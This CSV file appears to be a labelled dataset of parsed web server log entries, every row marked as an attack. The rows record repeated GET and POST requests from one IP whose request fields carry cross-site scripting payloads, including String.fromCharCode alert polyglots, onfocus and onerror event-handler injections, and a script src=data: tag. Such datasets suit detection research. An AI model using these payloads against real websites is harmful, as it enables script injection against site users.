"","ip","date","hour","minute","seconds","zone","request1","request2","status","respsize","attaque"
"1","192.108.116.88","18/Dec/2017","13","00","31","+0000","GET "," HTTP/1.1/NA/datalab ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> ",200,1040,1
"2","192.108.116.88","18/Dec/2017","13","00","31","+0000","GET ","css/index.css HTTP/1.1/datalab ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> ",200,945,1
"3","192.108.116.88","18/Dec/2017","13","00","31","+0000","GET ","img/logo.png HTTP/1.1/datalab ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> ",200,34463,1
"4","192.108.116.88","18/Dec/2017","13","02","31","+0000","POST ","datalab HTTP/1.1/NA/datalab ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> ",NA,NA,1
"5","192.108.116.88","18/Dec/2017","13","04","31","+0000","POST ","datalab HTTP/1.1/NA/datalab ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> ",NA,NA,1
"6","192.108.116.88","18/Dec/2017","13","04","56","+0000","GET "," HTTP/1.1/NA/datalab '';!--""<XSS>=&{()} ",200,1040,1
"7","192.108.116.88","18/Dec/2017","13","04","56","+0000","GET ","css/index.css HTTP/1.1/datalab '';!--""<XSS>=&{()} ",200,945,1
"8","192.108.116.88","18/Dec/2017","13","04","56","+0000","GET ","img/logo.png HTTP/1.1/datalab '';!--""<XSS>=&{()} ",200,34463,1
"9","192.108.116.88","18/Dec/2017","13","04","57","+0000","POST ","datalab HTTP/1.1/NA/datalab '';!--""<XSS>=&{()} ",200,1073,1
"10","192.108.116.88","18/Dec/2017","13","04","57","+0000","GET ","css/index.css HTTP/1.1/datalab '';!--""<XSS>=&{()} ",304,NA,1
"11","192.108.116.88","18/Dec/2017","13","04","57","+0000","GET ","img/logo.png HTTP/1.1/datalab '';!--""<XSS>=&{()} ",304,NA,1
"12","192.108.116.88","18/Dec/2017","13","05","16","+0000","GET "," HTTP/1.1/NA/datalab 0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)- ",200,1040,1
"13","192.108.116.88","18/Dec/2017","13","05","16","+0000","GET ","css/index.css HTTP/1.1/datalab 0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)- ",200,945,1
"14","192.108.116.88","18/Dec/2017","13","05","16","+0000","GET ","img/logo.png HTTP/1.1/datalab 0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)- ",200,34463,1
"15","192.108.116.88","18/Dec/2017","13","05","16","+0000","POST ","datalab HTTP/1.1/NA/datalab 0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)- ",200,1073,1
"16","192.108.116.88","18/Dec/2017","13","05","16","+0000","GET ","img/logo.png HTTP/1.1/datalab 0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)- ",304,NA,1
"17","192.108.116.88","18/Dec/2017","13","05","16","+0000","GET ","css/index.css HTTP/1.1/datalab 0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)- ",304,NA,1
"18","192.108.116.88","18/Dec/2017","13","05","38","+0000","GET "," HTTP/1.1/NA/datalab <script/src=data:,alert()> ",200,1040,1
"19","192.108.116.88","18/Dec/2017","13","05","38","+0000","GET ","css/index.css HTTP/1.1/datalab <script/src=data:,alert()> ",200,945,1
"20","192.108.116.88","18/Dec/2017","13","05","38","+0000","GET ","img/logo.png HTTP/1.1/datalab <script/src=data:,alert()> ",200,34463,1
"21","192.108.116.88","18/Dec/2017","13","05","39","+0000","POST ","datalab HTTP/1.1/NA/datalab <script/src=data:,alert()> ",200,1073,1
"22","192.108.116.88","18/Dec/2017","13","05","39","+0000","GET ","css/index.css HTTP/1.1/datalab <script/src=data:,alert()> ",304,NA,1
"23","192.108.116.88","18/Dec/2017","13","05","39","+0000","GET ","img/logo.png HTTP/1.1/datalab <script/src=data:,alert()> ",304,NA,1
"24","192.108.116.88","18/Dec/2017","13","06","03","+0000","GET "," HTTP/1.1/NA/datalab <marquee/onstart=alert()> ",200,1040,1
"25","192.108.116.88","18/Dec/2017","13","06","03","+0000","GET ","css/index.css HTTP/1.1/datalab <marquee/onstart=alert()> ",200,945,1
"26","192.108.116.88","18/Dec/2017","13","06","03","+0000","GET ","img/logo.png HTTP/1.1/datalab <marquee/onstart=alert()> ",200,34463,1
"27","192.108.116.88","18/Dec/2017","13","06","03","+0000","POST ","datalab HTTP/1.1/NA/datalab <marquee/onstart=alert()> ",200,1073,1
"28","192.108.116.88","18/Dec/2017","13","06","04","+0000","GET ","css/index.css HTTP/1.1/datalab <marquee/onstart=alert()> ",304,NA,1
"29","192.108.116.88","18/Dec/2017","13","06","04","+0000","GET ","img/logo.png HTTP/1.1/datalab <marquee/onstart=alert()> ",304,NA,1
"30","192.108.116.88","18/Dec/2017","13","06","26","+0000","GET "," HTTP/1.1/NA/datalab <video/poster/onerror=alert()> ",200,1040,1
"31","192.108.116.88","18/Dec/2017","13","06","26","+0000","GET ","css/index.css HTTP/1.1/datalab <video/poster/onerror=alert()> ",200,945,1
"32","192.108.116.88","18/Dec/2017","13","06","26","+0000","GET ","img/logo.png HTTP/1.1/datalab <video/poster/onerror=alert()> ",200,34463,1
"33","192.108.116.88","18/Dec/2017","13","06","27","+0000","POST ","datalab HTTP/1.1/NA/datalab <video/poster/onerror=alert()> ",200,1073,1
